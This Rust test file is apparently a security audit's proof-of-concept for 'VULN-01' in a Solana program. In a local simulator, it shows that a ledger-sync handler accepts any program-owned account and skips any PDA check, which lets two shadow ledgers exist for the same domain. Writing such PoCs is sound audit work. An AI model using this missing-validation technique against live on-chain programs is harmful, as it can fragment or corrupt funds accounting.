// Skip when Kani builds the test suite.
#![cfg(not(kani))]
//! PoC for VULN-01: backing-domain ledger not bound to a canonical PDA.
//!
//! `handle_sync_backing_domain_ledger` (src/v16_program.rs:8620) accepts any
//! writable program-owned account as the ledger for a given (market, domain,
//! authority) triple.  No `expect_key(ledger_ai, &derived_pda)` call is made.
//!
//! This test proves the property by initialising two unrelated accounts
//! (`ledger_a` and `ledger_b`) as backing-domain ledgers for the SAME domain
//! in two back-to-back calls.  Both succeed.  Both parse as valid
//! `BackingDomainLedgerAccountV16` structs referencing the same market /
//! domain / authority — demonstrating that the on-chain state is fragmented
//! across two "shadow" accounts with no canonical uniqueness guarantee.
//!
//! Instruction encoding (src/v16_program.rs:4098-4101):
//!   discriminant = 53 || u16 domain (little-endian)
//! Accounts for `SyncBackingDomainLedger`:
//!   [0] authority   — signer (must equal backing_bucket_authority for domain)
//!   [1] market_ai   — writable, program-owned
//!   [2] ledger_ai   — writable, program-owned  ← no PDA check

use litesvm::LiteSVM;
use percolator_prog::{
    ix::Instruction as ProgInstruction,
    processor::ASSET_ACTION_ACTIVATE,
    state,
};
use solana_sdk::{
    account::Account,
    compute_budget::ComputeBudgetInstruction,
    instruction::{AccountMeta, Instruction},
    program_option::COption,
    program_pack::Pack,
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::{Transaction, TransactionError},
};
use spl_token::state::Mint;
use std::path::PathBuf;

// ── constants ────────────────────────────────────────────────────────────────

/// One tradable asset (index 1) is the minimum market configuration.
const MAX_PORTFOLIO_ASSETS: u16 = 1;

/// Asset 1 → backing domain index = 2 * asset_index = 2.
const DOMAIN: u16 = 2;

// ── helpers ──────────────────────────────────────────────────────────────────

fn program_path() -> PathBuf {
    let mut p = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    p.push("target/deploy/percolator_prog.so");
    assert!(p.exists(), "BPF missing at {p:?} — run `cargo build-sbf --no-default-features`");
    p
}

fn spl_token_path() -> PathBuf {
    let cargo_home = std::env::var_os("CARGO_HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| {
            let mut h = PathBuf::from(std::env::var_os("HOME").expect("HOME not set"));
            h.push(".cargo");
            h
        });
    for entry in std::fs::read_dir(cargo_home.join("registry/src")).expect("CARGO_HOME/registry/src") {
        let cand = entry.expect("dir entry").path()
            .join("litesvm-0.1.0/src/spl/programs/spl_token-3.5.0.so");
        if cand.exists() {
            return cand;
        }
    }
    panic!("spl_token-3.5.0.so not found under CARGO_HOME — ensure litesvm 0.1.0 is in the lockfile");
}

fn canonical_vault_ata(vault_authority: &Pubkey, mint: &Pubkey) -> Pubkey {
    let ata_program: Pubkey = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL".parse().unwrap();
    Pubkey::find_program_address(
        &[vault_authority.as_ref(), spl_token::ID.as_ref(), mint.as_ref()],
        &ata_program,
    ).0
}

// ── minimal harness ──────────────────────────────────────────────────────────

struct Env {
    svm: LiteSVM,
    program_id: Pubkey,
    payer: Keypair,
    admin: Keypair,
    market: Pubkey,
}

impl Env {
    fn new() -> Self {
        let mut svm = LiteSVM::new();
        let program_id = percolator_prog::id();
        svm.add_program(program_id, &std::fs::read(program_path()).expect("wrapper BPF"));
        svm.add_program(spl_token::ID, &std::fs::read(spl_token_path()).expect("spl_token BPF"));

        let payer = Keypair::new();
        let admin = Keypair::new();
        let market = Pubkey::new_unique();
        let mint = Pubkey::new_unique();
        let (vault_authority, _) =
            Pubkey::find_program_address(&[b"vault", market.as_ref()], &program_id);
        let vault = canonical_vault_ata(&vault_authority, &mint);

        svm.airdrop(&payer.pubkey(), 1_000_000_000_000).unwrap();
        svm.airdrop(&admin.pubkey(), 1_000_000_000_000).unwrap();

        // Mint account
        let mut mint_data = vec![0u8; Mint::LEN];
        Mint::pack(
            Mint { mint_authority: COption::None, supply: 0, decimals: 0, is_initialized: true, freeze_authority: COption::None },
            &mut mint_data,
        ).unwrap();
        svm.set_account(mint, Account { lamports: 1_000_000_000, data: mint_data, owner: spl_token::ID, executable: false, rent_epoch: 0 }).unwrap();

        // Vault token account (canonical ATA for the vault authority)
        let mut vault_data = vec![0u8; spl_token::state::Account::LEN];
        spl_token::state::Account::pack(
            spl_token::state::Account {
                mint,
                owner: vault_authority,
                amount: 0,
                delegate: COption::None,
                state: spl_token::state::AccountState::Initialized,
                is_native: COption::None,
                delegated_amount: 0,
                close_authority: COption::None,
            },
            &mut vault_data,
        ).unwrap();
        svm.set_account(vault, Account { lamports: 1_000_000_000, data: vault_data, owner: spl_token::ID, executable: false, rent_epoch: 0 }).unwrap();

        // Market account (zero-initialised, program-owned)
        let market_len = state::market_account_len_for_capacity(MAX_PORTFOLIO_ASSETS as usize).unwrap();
        svm.set_account(market, Account { lamports: 1_000_000_000, data: vec![0u8; market_len], owner: program_id, executable: false, rent_epoch: 0 }).unwrap();

        let mut env = Env { svm, program_id, payer, admin, market };
        let admin_clone = env.admin.insecure_clone();

        // InitMarket
        env.send_ok(
            ProgInstruction::InitMarket {
                max_portfolio_assets: MAX_PORTFOLIO_ASSETS,
                h_min: 0,
                h_max: 10,
                initial_price: 100,
                min_nonzero_mm_req: 1,
                min_nonzero_im_req: 2,
                maintenance_margin_bps: 10_000,
                initial_margin_bps: 10_000,
                max_trading_fee_bps: 10_000,
                trade_fee_base_bps: 0,
                liquidation_fee_bps: 0,
                liquidation_fee_cap: 0,
                min_liquidation_abs: 0,
                max_price_move_bps_per_slot: 10_000,
                max_accrual_dt_slots: 1,
                max_abs_funding_e9_per_slot: 0,
                min_funding_lifetime_slots: 1,
                max_account_b_settlement_chunks: 1,
                max_bankrupt_close_chunks: 1,
                max_bankrupt_close_lifetime_slots: 100,
                public_b_chunk_atoms: percolator::MAX_VAULT_TVL,
                maintenance_fee_per_slot: 0,
            },
            vec![
                AccountMeta::new(admin_clone.pubkey(), true),
                AccountMeta::new(market, false),
                AccountMeta::new_readonly(mint, false),
            ],
            &[&admin_clone],
        ).expect("InitMarket failed");

        // Activate asset 1 — sets backing_bucket_authority = admin for domain DOMAIN
        env.send_ok(
            ProgInstruction::UpdateAssetLifecycle {
                action: ASSET_ACTION_ACTIVATE,
                asset_index: 1,
                now_slot: 1,
                initial_price: 100,
                insurance_authority: admin_clone.pubkey().to_bytes(),
                insurance_operator: admin_clone.pubkey().to_bytes(),
                backing_bucket_authority: admin_clone.pubkey().to_bytes(),
                oracle_authority: admin_clone.pubkey().to_bytes(),
            },
            vec![
                AccountMeta::new(admin_clone.pubkey(), true),
                AccountMeta::new(market, false),
            ],
            &[&admin_clone],
        ).expect("UpdateAssetLifecycle failed");

        env
    }

    fn send_ok(
        &mut self,
        ix: ProgInstruction,
        accounts: Vec<AccountMeta>,
        signers: &[&Keypair],
    ) -> Result<(), TransactionError> {
        self.svm.expire_blockhash();
        let instructions = vec![
            ComputeBudgetInstruction::request_heap_frame(128 * 1024),
            ComputeBudgetInstruction::set_compute_unit_limit(1_400_000),
            Instruction { program_id: self.program_id, accounts, data: ix.encode() },
        ];
        let mut all = vec![&self.payer];
        all.extend_from_slice(signers);
        let tx = Transaction::new_signed_with_payer(
            &instructions,
            Some(&self.payer.pubkey()),
            &all,
            self.svm.latest_blockhash(),
        );
        self.svm.send_transaction(tx).map(|_| ()).map_err(|e| e.err)
    }
}

// ── PoC test ─────────────────────────────────────────────────────────────────

/// Demonstrates VULN-01: two distinct program-owned accounts both accepted as
/// "the" backing-domain ledger for the same (market, domain=2, authority=admin)
/// triple.
///
/// Expected outcome: BOTH calls succeed, producing two independent ledger
/// accounts with identical (market_group, domain, authority) metadata.  Any
/// handler that subsequently receives one of these accounts is blind to state
/// recorded in the other — fragmented bookkeeping with no canonical PDA anchor.
#[test]
fn vuln01_shadow_ledger_fragmentation() {
    let mut env = Env::new();

    let ledger_len = state::backing_domain_ledger_account_len();
    let admin = env.admin.insecure_clone();

    // Two distinct zero-initialised accounts, both owned by the program.
    let ledger_a = Pubkey::new_unique();
    let ledger_b = Pubkey::new_unique();
    for &key in &[ledger_a, ledger_b] {
        env.svm.set_account(key, Account {
            lamports: 1_000_000_000,
            data: vec![0u8; ledger_len],
            owner: env.program_id,
            executable: false,
            rent_epoch: 0,
        }).unwrap();
    }

    // ── call 1: initialise ledger_a ──────────────────────────────────────────
    env.send_ok(
        ProgInstruction::SyncBackingDomainLedger { domain: DOMAIN },
        vec![
            AccountMeta::new(admin.pubkey(), true),
            AccountMeta::new(env.market, false),
            AccountMeta::new(ledger_a, false),
        ],
        &[&admin],
    ).expect("call 1 (ledger_a) must succeed");

    // ── call 2: same domain, different account — must also succeed ───────────
    env.send_ok(
        ProgInstruction::SyncBackingDomainLedger { domain: DOMAIN },
        vec![
            AccountMeta::new(admin.pubkey(), true),
            AccountMeta::new(env.market, false),
            AccountMeta::new(ledger_b, false),
        ],
        &[&admin],
    ).expect("call 2 (ledger_b, same domain) must also succeed — VULN-01 confirmed");

    // ── verify both accounts are initialised valid ledgers ───────────────────
    let data_a = env.svm.get_account(&ledger_a).expect("ledger_a account").data;
    let data_b = env.svm.get_account(&ledger_b).expect("ledger_b account").data;

    assert!(state::is_initialized(&data_a), "ledger_a should be initialized");
    assert!(state::is_initialized(&data_b), "ledger_b should be initialized");

    let parsed_a = state::read_backing_domain_ledger(&data_a)
        .expect("ledger_a should parse as valid BackingDomainLedgerAccountV16");
    let parsed_b = state::read_backing_domain_ledger(&data_b)
        .expect("ledger_b should parse as valid BackingDomainLedgerAccountV16");

    // Both shadow ledgers claim the same (market, domain, authority) triple.
    assert_eq!(parsed_a.market_group, parsed_b.market_group,
        "both ledgers reference the same market");
    assert_eq!(parsed_a.domain, parsed_b.domain,
        "both ledgers reference the same domain");
    assert_eq!(parsed_a.authority, parsed_b.authority,
        "both ledgers reference the same authority");

    // But they sit at different addresses — canonical uniqueness is violated.
    assert_ne!(ledger_a, ledger_b);

    // Any future operation that writes to ledger_a is invisible from ledger_b
    // and vice versa.  There is no on-chain enforcement that ledger_a is "the"
    // ledger — a second caller who has only ever seen ledger_b will believe the
    // domain's recorded balance is independent of what ledger_a reflects.
}
